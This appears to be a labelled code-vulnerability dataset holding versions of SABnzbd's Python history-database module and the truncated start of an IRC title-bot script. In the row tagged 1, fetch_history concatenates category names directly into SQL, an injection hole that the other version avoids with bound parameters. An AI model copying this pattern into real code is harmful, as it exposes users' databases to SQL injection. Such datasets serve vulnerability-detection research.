                    logging.error(T('Cannot write to History database, check access rights!'))
                    # Report back success, because there's no recovery possible
                    return True
                elif 'not a database' in error or 'malformed' in error or 'duplicate column name' in error:
                    logging.error(T('Damaged History database, created empty replacement'))
                    logging.info(""Traceback: "", exc_info=True)
                    self.close()
                    try:
                        os.remove(HistoryDB.db_path)
                    except:
                        pass
                    self.connect()
                    # Return False in case of ""duplicate column"" error
                    # because the column addition in connect() must be terminated
                    return 'duplicate column name' not in error
                else:
                    logging.error(T('SQL Command Failed, see log'))
                    logging.info(""SQL: %s"", command)
                    logging.info(""Arguments: %s"", repr(args))
                    logging.info(""Traceback: "", exc_info=True)
                    try:
                        self.con.rollback()
                    except:
                        logging.debug(""Rollback Failed:"", exc_info=True)
            return False

    def create_history_db(self):
        """""" Create a new (empty) database file """"""
        self.execute(""""""
        CREATE TABLE ""history"" (
            ""id"" INTEGER PRIMARY KEY,
            ""completed"" INTEGER NOT NULL,
            ""name"" TEXT NOT NULL,
            ""nzb_name"" TEXT NOT NULL,
            ""category"" TEXT,
            ""pp"" TEXT,
            ""script"" TEXT,
            ""report"" TEXT,
            ""url"" TEXT,
            ""status"" TEXT,
            ""nzo_id"" TEXT,
            ""storage"" TEXT,
            ""path"" TEXT,
            ""script_log"" BLOB,
            ""script_line"" TEXT,
            ""download_time"" INTEGER,
            ""postproc_time"" INTEGER,
            ""stage_log"" TEXT,
            ""downloaded"" INTEGER,
            ""completeness"" INTEGER,
            ""fail_message"" TEXT,
            ""url_info"" TEXT,
            ""bytes"" INTEGER,
            ""meta"" TEXT,
            ""series"" TEXT,
            ""md5sum"" TEXT,
            ""password"" TEXT
        )
        """""")
        self.execute('PRAGMA user_version = 2;')

    def save(self):
        """""" Save database to disk """"""
        try:
            self.con.commit()
        except:
            logging.error(T('SQL Commit Failed, see log'))
            logging.info(""Traceback: "", exc_info=True)

    def close(self):
        """""" Close database connection """"""
        try:
            self.c.close()
            self.con.close()
        except:
            logging.error(T('Failed to close database, see log'))
            logging.info(""Traceback: "", exc_info=True)

    def remove_completed(self, search=None):
        """""" Remove all completed jobs from the database, optional with `search` pattern """"""
        search = convert_search(search)
        logging.info('Removing all completed jobs from history')
        return self.execute(""""""DELETE FROM history WHERE name LIKE ? AND status = 'Completed'"""""", (search,), save=True)

    def get_failed_paths(self, search=None):
        """""" Return list of all storage paths of failed jobs (may contain non-existing or empty paths) """"""
        search = convert_search(search)
        fetch_ok = self.execute(""""""SELECT path FROM history WHERE name LIKE ? AND status = 'Failed'"""""", (search,))
        if fetch_ok:
            return [item.get('path') for item in self.c.fetchall()]
        else:
            return []

    def remove_failed(self, search=None):
        """""" Remove all failed jobs from the database, optional with `search` pattern """"""
        search = convert_search(search)
        logging.info('Removing all failed jobs from history')
        return self.execute(""""""DELETE FROM history WHERE name LIKE ? AND status = 'Failed'"""""", (search,), save=True)

    def remove_history(self, jobs=None):
        """""" Remove all jobs in the list `jobs`, empty list will remove all completed jobs """"""
        if jobs is None:
            self.remove_completed()
        else:
            if not isinstance(jobs, list):
                jobs = [jobs]

            for job in jobs:
                self.execute(""""""DELETE FROM history WHERE nzo_id=?"""""", (job,))
                logging.info('Removing job %s from history', job)

        self.save()

    def auto_history_purge(self):
        """""" Remove history items based on the configured history-retention """"""
        if sabnzbd.cfg.history_retention() == ""0"":
            return

        if sabnzbd.cfg.history_retention() == ""-1"":
            # Delete all non-failed ones
            self.remove_completed()

        if ""d"" in sabnzbd.cfg.history_retention():
            # How many days to keep?
            days_to_keep = int_conv(sabnzbd.cfg.history_retention().strip()[:-1])
            seconds_to_keep = int(time.time()) - days_to_keep*3600*24
            if days_to_keep > 0:
                logging.info('Removing completed jobs older than %s days from history', days_to_keep)
                return self.execute(""""""DELETE FROM history WHERE status = 'Completed' AND completed < ?"""""", (seconds_to_keep,), save=True)
        else:
            # How many to keep?
            to_keep = int_conv(sabnzbd.cfg.history_retention())
            if to_keep > 0:
                logging.info('Removing all but last %s completed jobs from history', to_keep)
                return self.execute(""""""DELETE FROM history WHERE id NOT IN ( SELECT id FROM history WHERE status = 'Completed' ORDER BY completed DESC LIMIT ? )"""""", (to_keep,), save=True)


    def add_history_db(self, nzo, storage, path, postproc_time, script_output, script_line):
        """""" Add a new job entry to the database """"""
        t = build_history_info(nzo, storage, path, postproc_time, script_output, script_line)

        if self.execute(""""""INSERT INTO history (completed, name, nzb_name, category, pp, script, report,
        url, status, nzo_id, storage, path, script_log, script_line, download_time, postproc_time, stage_log,
        downloaded, completeness, fail_message, url_info, bytes, series, md5sum, password)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""""", t):
            self.save()
        logging.info('Added job %s to history', nzo.final_name)

    def fetch_history(self, start=None, limit=None, search=None, failed_only=0, categories=None):
        """""" Return records for specified jobs """"""
        command_args = [convert_search(search)]

        post = ''
        if categories:
            categories = ['*' if c == 'Default' else c for c in categories]
            post = "" AND (CATEGORY = ?""
            post += "" OR CATEGORY = ? "" * (len(categories)-1)
            post += "")""
            command_args.extend(categories)
        if failed_only:
            post += ' AND STATUS = ""Failed""'

        cmd = 'SELECT COUNT(*) FROM history WHERE name LIKE ?'
        res = self.execute(cmd + post, tuple(command_args))
        total_items = -1
        if res:
            try:
                total_items = self.c.fetchone().get('COUNT(*)')
            except AttributeError:
                pass

        if not start:
            start = 0
        if not limit:
            limit = total_items

        command_args.extend([start, limit])
        cmd = 'SELECT * FROM history WHERE name LIKE ?'
        fetch_ok = self.execute(cmd + post + ' ORDER BY completed desc LIMIT ?, ?', tuple(command_args))

        if fetch_ok:
            items = self.c.fetchall()
        else:
            items = []

        fetched_items = len(items)

        # Unpack the single line stage log
        # Stage Name is separated by ::: stage lines by ; and stages by \r\n
        items = [unpack_history_info(item) for item in items]

        return (items, fetched_items, total_items)

    def have_episode(self, series, season, episode):
        """""" Check whether History contains this series episode """"""
        total = 0
        series = series.lower().replace('.', ' ').replace('_', ' ').replace('  ', ' ')
        if series and season and episode:
            pattern = '%s/%s/%s' % (series, season, episode)
            res = self.execute(""select count(*) from History WHERE series = ? AND STATUS != 'Failed'"", (pattern,))
            if res:
                try:
                    total = self.c.fetchone().get('count(*)')
                except AttributeError:
                    pass
        return total > 0

    def have_md5sum(self, md5sum):
        """""" Check whether this md5sum already in History """"""
        total = 0
        res = self.execute(""select count(*) from History WHERE md5sum = ? AND STATUS != 'Failed'"", (md5sum,))
        if res:
            try:
                total = self.c.fetchone().get('count(*)')
            except AttributeError:
                pass
        return total > 0

    def get_history_size(self):
        """""" Returns the total size of the history and
            amounts downloaded in the last month and week
        """"""
        # Total Size of the history
        total = 0
        if self.execute('''SELECT sum(bytes) FROM history'''):
            try:
                total = self.c.fetchone().get('sum(bytes)')
            except AttributeError:
                pass

        # Amount downloaded this month
        # r = time.gmtime(time.time())
        # month_timest = int(time.mktime((r.tm_year, r.tm_mon, 0, 0, 0, 1, r.tm_wday, r.tm_yday, r.tm_isdst)))
        month_timest = int(this_month(time.time()))

        month = 0
        if self.execute('''SELECT sum(bytes) FROM history WHERE ""completed"">?''', (month_timest,)):
            try:
                month = self.c.fetchone().get('sum(bytes)')
            except AttributeError:
                pass

        # Amount downloaded this week
        week_timest = int(this_week(time.time()))

        week = 0
        if self.execute('''SELECT sum(bytes) FROM history WHERE ""completed"">?''', (week_timest,)):
            try:
                week = self.c.fetchone().get('sum(bytes)')
            except AttributeError:
                pass

        return (total, month, week)

    def get_script_log(self, nzo_id):
        """""" Return decompressed log file """"""
        data = ''
        t = (nzo_id,)
        if self.execute('SELECT script_log FROM history WHERE nzo_id=?', t):
            try:
                data = zlib.decompress(self.c.fetchone().get('script_log'))
            except:
                pass
        return data

    def get_name(self, nzo_id):
        """""" Return name of the job `nzo_id` """"""
        t = (nzo_id,)
        name = ''
        if self.execute('SELECT name FROM history WHERE nzo_id=?', t):
            try:
                name = self.c.fetchone().get('name')
            except AttributeError:
                pass
        return name

    def get_path(self, nzo_id):
        """""" Return the `incomplete` path of the job `nzo_id` """"""
        t = (nzo_id,)
        path = ''
        if self.execute('SELECT path FROM history WHERE nzo_id=?', t):
            try:
                path = self.c.fetchone().get('path')
            except AttributeError:
                pass
        return path

    def get_other(self, nzo_id):
        """""" Return additional data for job `nzo_id` """"""
        t = (nzo_id,)
        if self.execute('SELECT * FROM history WHERE nzo_id=?', t):
            try:
                items = self.c.fetchall()[0]
                dtype = items.get('report')
                url = items.get('url')
                pp = items.get('pp')
                script = items.get('script')
                cat = items.get('category')
            except (AttributeError, IndexError):
                return '', '', '', '', ''
        return dtype, url, pp, script, cat


def dict_factory(cursor, row):
    """""" Return a dictionary for the current database position """"""
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d


_PP_LOOKUP = {0: '', 1: 'R', 2: 'U', 3: 'D'}
def build_history_info(nzo, storage='', downpath='', postproc_time=0, script_output='', script_line=''):
    """""" Collects all the information needed for the database """"""

    if not downpath:
        downpath = nzo.downpath
    path = decode_factory(downpath)
    storage = decode_factory(storage)
    script_line = decode_factory(script_line)

    flagRepair, flagUnpack, flagDelete = nzo.repair_opts
    nzo_info = decode_factory(nzo.nzo_info)

    url = decode_factory(nzo.url)

    completed = int(time.time())
    name = decode_factory(nzo.final_name)

    nzb_name = decode_factory(nzo.filename)
    category = decode_factory(nzo.cat)
    pp = _PP_LOOKUP.get(sabnzbd.opts_to_pp(flagRepair, flagUnpack, flagDelete), 'X')
    script = decode_factory(nzo.script)
    status = decode_factory(nzo.status)
    nzo_id = nzo.nzo_id
    bytes = nzo.bytes_downloaded

    if script_output:
        # Compress the output of the script
        script_log = sqlite3.Binary(zlib.compress(script_output))
        #
    else:
        script_log = ''

    download_time = decode_factory(nzo_info.get('download_time', 0))

    downloaded = nzo.bytes_downloaded
    completeness = 0
    fail_message = decode_factory(nzo.fail_msg)
    url_info = nzo_info.get('details', '') or nzo_info.get('more_info', '')

    # Get the dictionary containing the stages and their unpack process
    stages = decode_factory(nzo.unpack_info)
    # Pack the dictionary up into a single string
    # Stage Name is separated by ::: stage lines by ; and stages by \r\n
    lines = []
    for key, results in stages.iteritems():
        lines.append('%s:::%s' % (key, ';'.join(results)))
    stage_log = '\r\n'.join(lines)

    # Reuse the old 'report' column to indicate a URL-fetch
    report = 'future' if nzo.futuretype else ''

    # Analyze series info only when job is finished
    series = u''
    if postproc_time:
        seriesname, season, episode, dummy = sabnzbd.newsunpack.analyse_show(nzo.final_name)
        if seriesname and season and episode:
            series = u'%s/%s/%s' % (seriesname.lower(), season, episode)

    # See whatever the first password was, for the Retry
    password = ''
    passwords = get_all_passwords(nzo)
    if passwords:
        password = passwords[0]

    return (completed, name, nzb_name, category, pp, script, report, url, status, nzo_id, storage, path,
            script_log, script_line, download_time, postproc_time, stage_log, downloaded, completeness,
            fail_message, url_info, bytes, series, nzo.md5sum, password)



def unpack_history_info(item):
    """""" Expands the single line stage_log from the DB
        into a python dictionary for use in the history display
    """"""
    # Stage Name is separated by ::: stage lines by ; and stages by \r\n
    lst = item['stage_log']
    if lst:
        try:
            lines = lst.split('\r\n')
        except:
            logging.error(T('Invalid stage logging in history for %s') + ' (\\r\\n)', unicoder(item['name']))
            logging.debug('Lines: %s', lst)
            lines = []
        lst = [None for x in STAGES]
        for line in lines:
            stage = {}
            try:
                key, logs = line.split(':::')
            except:
                logging.debug('Missing key:::logs ""%s""', line)
                key = line
                logs = ''
            stage['name'] = key
            stage['actions'] = []
            try:
                logs = logs.split(';')
            except:
                logging.error(T('Invalid stage logging in history for %s') + ' (;)', unicoder(item['name']))
                logging.debug('Logs: %s', logs)
                logs = []
            for log in logs:
                stage['actions'].append(log)
            try:
                lst[STAGES[key]] = stage
            except KeyError:
                lst.append(stage)
        # Remove unused stages
        item['stage_log'] = [x for x in lst if x is not None]

    if item['script_log']:
        item['script_log'] = ''
    # The action line is only available for items in the postproc queue
    if 'action_line' not in item:
        item['action_line'] = ''
    return item


def midnight_history_purge():
    logging.info('Scheduled history purge')
    history_db = HistoryDB()
    history_db.auto_history_purge()
    history_db.close()


def decode_factory(text):
    """""" Recursively looks through the supplied argument
        and converts and text to Unicode
    """"""
    if isinstance(text, str):
        return unicoder(text)

    elif isinstance(text, list):
        new_text = []
        for t in text:
            new_text.append(decode_factory(t))
        return new_text

    elif isinstance(text, dict):
        new_text = {}
        for key in text:
            new_text[key] = decode_factory(text[key])
        return new_text
    else:
        return text
/n/n/n",0,sql
29,13,ad9fef5f416ef31eb3fdf7c1774434092fd6a52c,"/sabnzbd/database.py/n/n#!/usr/bin/python -OO
# Copyright 2008-2017 The SABnzbd-Team <team@sabnzbd.org>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

""""""
sabnzbd.database - Database Support
""""""

try:
    import sqlite3
except:
    try:
        import pysqlite2.dbapi2 as sqlite3
    except:
        pass

import os
import time
import zlib
import logging
import sys
import threading

import sabnzbd
import sabnzbd.cfg
from sabnzbd.constants import DB_HISTORY_NAME, STAGES
from sabnzbd.encoding import unicoder
from sabnzbd.bpsmeter import this_week, this_month
from sabnzbd.decorators import synchronized
from sabnzbd.misc import get_all_passwords, int_conv

DB_LOCK = threading.RLock()


def convert_search(search):
    """""" Convert classic wildcard to SQL wildcard """"""
    if not search:
        # Default value
        search = ''
    else:
        # Allow * for wildcard matching and space
        search = search.replace('*', '%').replace(' ', '%')

    # Allow ^ for start of string and $ for end of string
    if search and search.startswith('^'):
        search = search.replace('^', '')
        search += '%'
    elif search and search.endswith('$'):
        search = search.replace('$', '')
        search = '%' + search
    else:
        search = '%' + search + '%'
    return search


class HistoryDB(object):
    """""" Class to access the History database
        Each class-instance will create an access channel that
        can be used in one thread.
        Each thread needs its own class-instance!
    """"""
    # These class attributes will be accessed directly because
    # they need to be shared by all instances
    db_path = None        # Will contain full path to history database
    done_cleaning = False # Ensure we only do one Vacuum per session

    @synchronized(DB_LOCK)
    def __init__(self):
        """""" Determine databse path and create connection """"""
        self.con = self.c = None
        if not HistoryDB.db_path:
            HistoryDB.db_path = os.path.join(sabnzbd.cfg.admin_dir.get_path(), DB_HISTORY_NAME)
        self.connect()


    def connect(self):
        """""" Create a connection to the database """"""
        create_table = not os.path.exists(HistoryDB.db_path)
        self.con = sqlite3.connect(HistoryDB.db_path)
        self.con.row_factory = dict_factory
        self.c = self.con.cursor()
        if create_table:
            self.create_history_db()
        elif not HistoryDB.done_cleaning:
            # Run VACUUM on sqlite
            # When an object (table, index, or trigger) is dropped from the database, it leaves behind empty space
            # http://www.sqlite.org/lang_vacuum.html
            HistoryDB.done_cleaning = True
            self.execute('VACUUM')

        self.execute('PRAGMA user_version;')
        try:
            version = self.c.fetchone()['user_version']
        except TypeError:
            version = 0
        if version < 1:
            # Add any missing columns added since first DB version
            # Use ""and"" to stop when database has been reset due to corruption
            _ = self.execute('PRAGMA user_version = 1;') and \
                self.execute('ALTER TABLE ""history"" ADD COLUMN series TEXT;') and \
                self.execute('ALTER TABLE ""history"" ADD COLUMN md5sum TEXT;')
        if version < 2:
            # Add any missing columns added since second DB version
            # Use ""and"" to stop when database has been reset due to corruption
            _ = self.execute('PRAGMA user_version = 2;') and \
                self.execute('ALTER TABLE ""history"" ADD COLUMN password TEXT;')


    def execute(self, command, args=(), save=False):
        ''' Wrapper for executing SQL commands '''
        for tries in xrange(5, 0, -1):
            try:
                if args and isinstance(args, tuple):
                    self.c.execute(command, args)
                else:
                    self.c.execute(command)
                if save:
                    self.save()
                return True
            except:
                error = str(sys.exc_value)
                if tries >= 0 and 'is locked' in error:
                    logging.debug('Database locked, wait and retry')
                    time.sleep(0.5)
                    continue
                elif 'readonly' in error:
                    logging.error(T('Cannot write to History database, check access rights!'))
                    # Report back success, because there's no recovery possible
                    return True
                elif 'not a database' in error or 'malformed' in error or 'duplicate column name' in error:
                    logging.error(T('Damaged History database, created empty replacement'))
                    logging.info(""Traceback: "", exc_info=True)
                    self.close()
                    try:
                        os.remove(HistoryDB.db_path)
                    except:
                        pass
                    self.connect()
                    # Return False in case of ""duplicate column"" error
                    # because the column addition in connect() must be terminated
                    return 'duplicate column name' not in error
                else:
                    logging.error(T('SQL Command Failed, see log'))
                    logging.debug(""SQL: %s"", command)
                    logging.info(""Traceback: "", exc_info=True)
                    try:
                        self.con.rollback()
                    except:
                        logging.debug(""Rollback Failed:"", exc_info=True)
            return False

    def create_history_db(self):
        """""" Create a new (empty) database file """"""
        self.execute(""""""
        CREATE TABLE ""history"" (
            ""id"" INTEGER PRIMARY KEY,
            ""completed"" INTEGER NOT NULL,
            ""name"" TEXT NOT NULL,
            ""nzb_name"" TEXT NOT NULL,
            ""category"" TEXT,
            ""pp"" TEXT,
            ""script"" TEXT,
            ""report"" TEXT,
            ""url"" TEXT,
            ""status"" TEXT,
            ""nzo_id"" TEXT,
            ""storage"" TEXT,
            ""path"" TEXT,
            ""script_log"" BLOB,
            ""script_line"" TEXT,
            ""download_time"" INTEGER,
            ""postproc_time"" INTEGER,
            ""stage_log"" TEXT,
            ""downloaded"" INTEGER,
            ""completeness"" INTEGER,
            ""fail_message"" TEXT,
            ""url_info"" TEXT,
            ""bytes"" INTEGER,
            ""meta"" TEXT,
            ""series"" TEXT,
            ""md5sum"" TEXT,
            ""password"" TEXT
        )
        """""")
        self.execute('PRAGMA user_version = 2;')

    def save(self):
        """""" Save database to disk """"""
        try:
            self.con.commit()
        except:
            logging.error(T('SQL Commit Failed, see log'))
            logging.info(""Traceback: "", exc_info=True)

    def close(self):
        """""" Close database connection """"""
        try:
            self.c.close()
            self.con.close()
        except:
            logging.error(T('Failed to close database, see log'))
            logging.info(""Traceback: "", exc_info=True)

    def remove_completed(self, search=None):
        """""" Remove all completed jobs from the database, optional with `search` pattern """"""
        search = convert_search(search)
        logging.info('Removing all completed jobs from history')
        return self.execute(""""""DELETE FROM history WHERE name LIKE ? AND status = 'Completed'"""""", (search,), save=True)

    def get_failed_paths(self, search=None):
        """""" Return list of all storage paths of failed jobs (may contain non-existing or empty paths) """"""
        search = convert_search(search)
        fetch_ok = self.execute(""""""SELECT path FROM history WHERE name LIKE ? AND status = 'Failed'"""""", (search,))
        if fetch_ok:
            return [item.get('path') for item in self.c.fetchall()]
        else:
            return []

    def remove_failed(self, search=None):
        """""" Remove all failed jobs from the database, optional with `search` pattern """"""
        search = convert_search(search)
        logging.info('Removing all failed jobs from history')
        return self.execute(""""""DELETE FROM history WHERE name LIKE ? AND status = 'Failed'"""""", (search,), save=True)

    def remove_history(self, jobs=None):
        """""" Remove all jobs in the list `jobs`, empty list will remove all completed jobs """"""
        if jobs is None:
            self.remove_completed()
        else:
            if not isinstance(jobs, list):
                jobs = [jobs]

            for job in jobs:
                self.execute(""""""DELETE FROM history WHERE nzo_id=?"""""", (job,))
                logging.info('Removing job %s from history', job)

        self.save()

    def auto_history_purge(self):
        """""" Remove history items based on the configured history-retention """"""
        if sabnzbd.cfg.history_retention() == ""0"":
            return

        if sabnzbd.cfg.history_retention() == ""-1"":
            # Delete all non-failed ones
            self.remove_completed()

        if ""d"" in sabnzbd.cfg.history_retention():
            # How many days to keep?
            days_to_keep = int_conv(sabnzbd.cfg.history_retention().strip()[:-1])
            seconds_to_keep = int(time.time()) - days_to_keep*3600*24
            if days_to_keep > 0:
                logging.info('Removing completed jobs older than %s days from history', days_to_keep)
                return self.execute(""""""DELETE FROM history WHERE status = 'Completed' AND completed < ?"""""", (seconds_to_keep,), save=True)
        else:
            # How many to keep?
            to_keep = int_conv(sabnzbd.cfg.history_retention())
            if to_keep > 0:
                logging.info('Removing all but last %s completed jobs from history', to_keep)
                return self.execute(""""""DELETE FROM history WHERE id NOT IN ( SELECT id FROM history WHERE status = 'Completed' ORDER BY completed DESC LIMIT ? )"""""", (to_keep,), save=True)


    def add_history_db(self, nzo, storage, path, postproc_time, script_output, script_line):
        """""" Add a new job entry to the database """"""
        t = build_history_info(nzo, storage, path, postproc_time, script_output, script_line)

        if self.execute(""""""INSERT INTO history (completed, name, nzb_name, category, pp, script, report,
        url, status, nzo_id, storage, path, script_log, script_line, download_time, postproc_time, stage_log,
        downloaded, completeness, fail_message, url_info, bytes, series, md5sum, password)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""""", t):
            self.save()
        logging.info('Added job %s to history', nzo.final_name)

    def fetch_history(self, start=None, limit=None, search=None, failed_only=0, categories=None):
        """""" Return records for specified jobs """"""
        search = convert_search(search)

        post = ''
        if categories:
            categories = ['*' if c == 'Default' else c for c in categories]
            post = "" AND (CATEGORY = '""
            post += ""' OR CATEGORY = '"".join(categories)
            post += ""' )""
        if failed_only:
            post += ' AND STATUS = ""Failed""'

        cmd = 'SELECT COUNT(*) FROM history WHERE name LIKE ?'
        res = self.execute(cmd + post, (search,))
        total_items = -1
        if res:
            try:
                total_items = self.c.fetchone().get('COUNT(*)')
            except AttributeError:
                pass

        if not start:
            start = 0
        if not limit:
            limit = total_items

        t = (search, start, limit)
        cmd = 'SELECT * FROM history WHERE name LIKE ?'
        fetch_ok = self.execute(cmd + post + ' ORDER BY completed desc LIMIT ?, ?', t)

        if fetch_ok:
            items = self.c.fetchall()
        else:
            items = []

        fetched_items = len(items)

        # Unpack the single line stage log
        # Stage Name is separated by ::: stage lines by ; and stages by \r\n
        items = [unpack_history_info(item) for item in items]

        return (items, fetched_items, total_items)

    def have_episode(self, series, season, episode):
        """""" Check whether History contains this series episode """"""
        total = 0
        series = series.lower().replace('.', ' ').replace('_', ' ').replace('  ', ' ')
        if series and season and episode:
            pattern = '%s/%s/%s' % (series, season, episode)
            res = self.execute(""select count(*) from History WHERE series = ? AND STATUS != 'Failed'"", (pattern,))
            if res:
                try:
                    total = self.c.fetchone().get('count(*)')
                except AttributeError:
                    pass
        return total > 0

    def have_md5sum(self, md5sum):
        """""" Check whether this md5sum already in History """"""
        total = 0
        res = self.execute(""select count(*) from History WHERE md5sum = ? AND STATUS != 'Failed'"", (md5sum,))
        if res:
            try:
                total = self.c.fetchone().get('count(*)')
            except AttributeError:
                pass
        return total > 0

    def get_history_size(self):
        """""" Returns the total size of the history and
            amounts downloaded in the last month and week
        """"""
        # Total Size of the history
        total = 0
        if self.execute('''SELECT sum(bytes) FROM history'''):
            try:
                total = self.c.fetchone().get('sum(bytes)')
            except AttributeError:
                pass

        # Amount downloaded this month
        # r = time.gmtime(time.time())
        # month_timest = int(time.mktime((r.tm_year, r.tm_mon, 0, 0, 0, 1, r.tm_wday, r.tm_yday, r.tm_isdst)))
        month_timest = int(this_month(time.time()))

        month = 0
        if self.execute('''SELECT sum(bytes) FROM history WHERE ""completed"">?''', (month_timest,)):
            try:
                month = self.c.fetchone().get('sum(bytes)')
            except AttributeError:
                pass

        # Amount downloaded this week
        week_timest = int(this_week(time.time()))

        week = 0
        if self.execute('''SELECT sum(bytes) FROM history WHERE ""completed"">?''', (week_timest,)):
            try:
                week = self.c.fetchone().get('sum(bytes)')
            except AttributeError:
                pass

        return (total, month, week)

    def get_script_log(self, nzo_id):
        """""" Return decompressed log file """"""
        data = ''
        t = (nzo_id,)
        if self.execute('SELECT script_log FROM history WHERE nzo_id=?', t):
            try:
                data = zlib.decompress(self.c.fetchone().get('script_log'))
            except:
                pass
        return data

    def get_name(self, nzo_id):
        """""" Return name of the job `nzo_id` """"""
        t = (nzo_id,)
        name = ''
        if self.execute('SELECT name FROM history WHERE nzo_id=?', t):
            try:
                name = self.c.fetchone().get('name')
            except AttributeError:
                pass
        return name

    def get_path(self, nzo_id):
        """""" Return the `incomplete` path of the job `nzo_id` """"""
        t = (nzo_id,)
        path = ''
        if self.execute('SELECT path FROM history WHERE nzo_id=?', t):
            try:
                path = self.c.fetchone().get('path')
            except AttributeError:
                pass
        return path

    def get_other(self, nzo_id):
        """""" Return additional data for job `nzo_id` """"""
        t = (nzo_id,)
        if self.execute('SELECT * FROM history WHERE nzo_id=?', t):
            try:
                items = self.c.fetchall()[0]
                dtype = items.get('report')
                url = items.get('url')
                pp = items.get('pp')
                script = items.get('script')
                cat = items.get('category')
            except (AttributeError, IndexError):
                return '', '', '', '', ''
        return dtype, url, pp, script, cat


def dict_factory(cursor, row):
    """""" Return a dictionary for the current database position """"""
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d


_PP_LOOKUP = {0: '', 1: 'R', 2: 'U', 3: 'D'}
def build_history_info(nzo, storage='', downpath='', postproc_time=0, script_output='', script_line=''):
    """""" Collects all the information needed for the database """"""

    if not downpath:
        downpath = nzo.downpath
    path = decode_factory(downpath)
    storage = decode_factory(storage)
    script_line = decode_factory(script_line)

    flagRepair, flagUnpack, flagDelete = nzo.repair_opts
    nzo_info = decode_factory(nzo.nzo_info)

    url = decode_factory(nzo.url)

    completed = int(time.time())
    name = decode_factory(nzo.final_name)

    nzb_name = decode_factory(nzo.filename)
    category = decode_factory(nzo.cat)
    pp = _PP_LOOKUP.get(sabnzbd.opts_to_pp(flagRepair, flagUnpack, flagDelete), 'X')
    script = decode_factory(nzo.script)
    status = decode_factory(nzo.status)
    nzo_id = nzo.nzo_id
    bytes = nzo.bytes_downloaded

    if script_output:
        # Compress the output of the script
        script_log = sqlite3.Binary(zlib.compress(script_output))
        #
    else:
        script_log = ''

    download_time = decode_factory(nzo_info.get('download_time', 0))

    downloaded = nzo.bytes_downloaded
    completeness = 0
    fail_message = decode_factory(nzo.fail_msg)
    url_info = nzo_info.get('details', '') or nzo_info.get('more_info', '')

    # Get the dictionary containing the stages and their unpack process
    stages = decode_factory(nzo.unpack_info)
    # Pack the dictionary up into a single string
    # Stage Name is separated by ::: stage lines by ; and stages by \r\n
    lines = []
    for key, results in stages.iteritems():
        lines.append('%s:::%s' % (key, ';'.join(results)))
    stage_log = '\r\n'.join(lines)

    # Reuse the old 'report' column to indicate a URL-fetch
    report = 'future' if nzo.futuretype else ''

    # Analyze series info only when job is finished
    series = u''
    if postproc_time:
        seriesname, season, episode, dummy = sabnzbd.newsunpack.analyse_show(nzo.final_name)
        if seriesname and season and episode:
            series = u'%s/%s/%s' % (seriesname.lower(), season, episode)

    # See whatever the first password was, for the Retry
    password = ''
    passwords = get_all_passwords(nzo)
    if passwords:
        password = passwords[0]

    return (completed, name, nzb_name, category, pp, script, report, url, status, nzo_id, storage, path,
            script_log, script_line, download_time, postproc_time, stage_log, downloaded, completeness,
            fail_message, url_info, bytes, series, nzo.md5sum, password)



def unpack_history_info(item):
    """""" Expands the single line stage_log from the DB
        into a python dictionary for use in the history display
    """"""
    # Stage Name is separated by ::: stage lines by ; and stages by \r\n
    lst = item['stage_log']
    if lst:
        try:
            lines = lst.split('\r\n')
        except:
            logging.error(T('Invalid stage logging in history for %s') + ' (\\r\\n)', unicoder(item['name']))
            logging.debug('Lines: %s', lst)
            lines = []
        lst = [None for x in STAGES]
        for line in lines:
            stage = {}
            try:
                key, logs = line.split(':::')
            except:
                logging.debug('Missing key:::logs ""%s""', line)
                key = line
                logs = ''
            stage['name'] = key
            stage['actions'] = []
            try:
                logs = logs.split(';')
            except:
                logging.error(T('Invalid stage logging in history for %s') + ' (;)', unicoder(item['name']))
                logging.debug('Logs: %s', logs)
                logs = []
            for log in logs:
                stage['actions'].append(log)
            try:
                lst[STAGES[key]] = stage
            except KeyError:
                lst.append(stage)
        # Remove unused stages
        item['stage_log'] = [x for x in lst if x is not None]

    if item['script_log']:
        item['script_log'] = ''
    # The action line is only available for items in the postproc queue
    if 'action_line' not in item:
        item['action_line'] = ''
    return item


def midnight_history_purge():
    logging.info('Scheduled history purge')
    history_db = HistoryDB()
    history_db.auto_history_purge()
    history_db.close()


def decode_factory(text):
    """""" Recursively looks through the supplied argument
        and converts and text to Unicode
    """"""
    if isinstance(text, str):
        return unicoder(text)

    elif isinstance(text, list):
        new_text = []
        for t in text:
            new_text.append(decode_factory(t))
        return new_text

    elif isinstance(text, dict):
        new_text = {}
        for key in text:
            new_text[key] = decode_factory(text[key])
        return new_text
    else:
        return text
/n/n/n",1,sql
0,16,4164d239f0f59b9ef04e3d168e68f958991fe88f,"titlebot.py/n/n#!/usr/bin/env python2
# coding: utf-8

import os
import sys
import socket
import string
import time
import urllib2
import HTMLParser
import zlib

import libirc

HOST=""irc.freenode.net""
PORT=6667
NICK=""titlebot""
IDENT=""titlebot""
REALNAME=""titlebot""
CHANS=[""##Orz""]

def ParseURL(s):
    http_idx=s.find('http:')
    https_idx=s.find('https:')
    if https_idx==-1:
        if http_idx==-1:
            return None
        else:
            return s[http_idx:]
    else:
        if http_idx==-1:
            return s[https_idx:]
        else:
            return s[min(http_idx, https_idx):]

try:
    c=libirc.IRCConnection()
    c.connect((HOST, PORT))
    c.setnick(NICK)
    c.setuser(IDENT, REALNAME)
    for CHAN in CHANS:
        c.join(CHAN)
except:
    time.sleep(10)
    sys.stderr.write(""Restarting...\n"")
    os.execlp(""python2"", ""python2"", __file__)
    raise
CHAN=CHANS[0]
socket.setdefaulttimeout(10)

html_parser=HTMLParser.HTMLParser()

quiting=False
while not quiting:
    if not c.sock:
        quiting=True
        time.sleep(10)
        sys.stderr.write(""Restarting...\n"")
        os.execlp(""python2"", ""python2"", __file__)
        break
    try:
